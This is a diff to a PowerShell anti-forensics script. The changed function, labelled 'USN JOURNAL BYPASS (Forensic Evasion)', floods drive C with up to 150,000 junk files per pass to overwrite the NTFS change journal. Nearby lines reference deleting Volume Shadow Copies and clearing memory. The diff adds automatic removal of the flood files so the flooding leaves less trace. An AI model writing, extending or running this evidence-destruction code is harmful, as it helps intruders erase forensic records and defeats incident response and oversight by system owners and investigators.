@@ -667,9 +667,9 @@ if (-not $api) {
     Write-Host "[+] Memory working sets cleared" -ForegroundColor Green
 }
 
-# ============================================================
-# PHASE 3: USN JOURNAL BYPASS (Forensic Evasion)
-# ============================================================
+
+# PHASE 3: USN JOURNAL BYPASS (Forensic Evasion) with Auto‑Cleanup
+# ================================================================
 Write-Host "[PHASE 3] Bypassing USN Journal..." -ForegroundColor Cyan
 
 function Bypass-USNJournal {
@@ -677,15 +677,17 @@ function Bypass-USNJournal {
         [int]$FloodCount = 15000,
         [int]$FileSize = 4096,
         [int]$Passes = 2,
-        [string[]]$TargetDrives = $null
+        [string[]]$TargetDrives = $null,
+        [switch]$DeleteTempFiles = $true   # New switch to clean up temp files
     )
 
-    Write-Host "[*] Starting USN Journal bypass (NO DELETION OF TEMP FILES)..." -ForegroundColor Cyan
+    Write-Host "[*] Starting USN Journal bypass..." -ForegroundColor Cyan
     Write-Host "    FloodCount = $FloodCount"
     Write-Host "    FileSize   = $FileSize bytes"
     Write-Host "    Passes     = $Passes"
     if ($TargetDrives) { Write-Host "    TargetDrives = $($TargetDrives -join ', ')" } 
     else { Write-Host "    TargetDrives = ALL fixed drives" }
+    Write-Host "    DeleteTempFiles = $DeleteTempFiles"
     Write-Host ""
 
     # Delete VSS
@@ -716,14 +718,17 @@ function Bypass-USNJournal {
                 continue
             }
 
-            # Flood with massive files – NO DELETION
-            Write-Host "        Creating $FloodCount files (will remain on disk)..." -NoNewline
+            # Flood with massive files – they will be cleaned up later
+            Write-Host "        Creating $FloodCount files..." -NoNewline
             $created = 0
+            $fileList = @()   # Keep track of created files for potential per-pass deletion (not used here)
             for ($i = 0; $i -lt $FloodCount; $i++) {
-                $tempName = "$driveLetter`:\$JOURNAL_FLUSH_$( [guid]::NewGuid().ToString() ).tmp"
+                # Use a fixed prefix for easy cleanup
+                $tempName = "$driveLetter`:\JOURNAL_FLUSH_$([guid]::NewGuid().ToString()).tmp"
                 try {
                     [System.IO.File]::WriteAllBytes($tempName, (New-Object byte[] $FileSize))
                     $created++
+                    $fileList += $tempName
                 } catch {
                     break
                 }
@@ -736,20 +741,42 @@ function Bypass-USNJournal {
             $anySuccess = $true
         }
 
+        # --- Cleanup: delete all temporary files we created on this drive ---
+        if ($DeleteTempFiles) {
+            Write-Host "    Cleaning up temporary files on $driveLetter... " -NoNewline
+            $pattern = "$driveLetter`:\JOURNAL_FLUSH_*.tmp"
+            $files = Get-ChildItem -Path $pattern -File -ErrorAction SilentlyContinue
+            if ($files) {
+                $removed = 0
+                foreach ($f in $files) {
+                    try {
+                        Remove-Item -Path $f.FullName -Force -ErrorAction Stop
+                        $removed++
+                    } catch {
+                        Write-Host "Failed to delete $($f.Name)" -ForegroundColor Yellow
+                    }
+                }
+                Write-Host "Deleted $removed files." -ForegroundColor Green
+            } else {
+                Write-Host "No files to delete." -ForegroundColor Gray
+            }
+        }
+
         Write-Host "[+] Finished processing $driveLetter" -ForegroundColor Green
         Write-Host ""
     }
 
-    # NOTE: Temp files are NOT deleted. They are left in the root of each drive.
-    # You can manually delete them later if needed.
-
     Write-Host ""
     if ($anySuccess) {
-        Write-Host "[✓] USN Journal bypass completed (temp files left on disk)!" -ForegroundColor Green
+        Write-Host "[✓] USN Journal bypass completed!" -ForegroundColor Green
+        if ($DeleteTempFiles) {
+            Write-Host "[*] Temporary files have been deleted." -ForegroundColor Green
+        } else {
+            Write-Host "[*] Temporary files remain at: X:\JOURNAL_FLUSH_*.tmp" -ForegroundColor Yellow
+            Write-Host "[*] You may delete them manually if desired." -ForegroundColor Yellow
+        }
         Write-Host "[*] Journal file was NOT deleted – only shrank and flooded." -ForegroundColor White
         Write-Host "[*] All old USN records overwritten." -ForegroundColor Green
-        Write-Host "[*] Temp files remain at: X:\$JOURNAL_FLUSH_*.tmp" -ForegroundColor Yellow
-        Write-Host "[*] You may delete them manually if desired." -ForegroundColor Yellow
     } else {
         Write-Host "[✗] USN Journal bypass failed on all targeted drives." -ForegroundColor Red
     }
@@ -760,8 +787,8 @@ $myFloodCount = 150000
 $myFileSize    = 4096
 $myPasses      = 3
 $myDrives      = @("C")   # Only target C: drive (adjust if needed)
-
-Bypass-USNJournal -FloodCount $myFloodCount -FileSize $myFileSize -Passes $myPasses -TargetDrives $myDrives
+# Set -DeleteTempFiles to $true to automatically remove temp files after bypass
+Bypass-USNJournal -FloodCount $myFloodCount -FileSize $myFileSize -Passes $myPasses -TargetDrives $myDrives -DeleteTempFiles
 
 
 # ========== CLEAN UP USN FLOOD FILES (Using CMD DEL) ==========
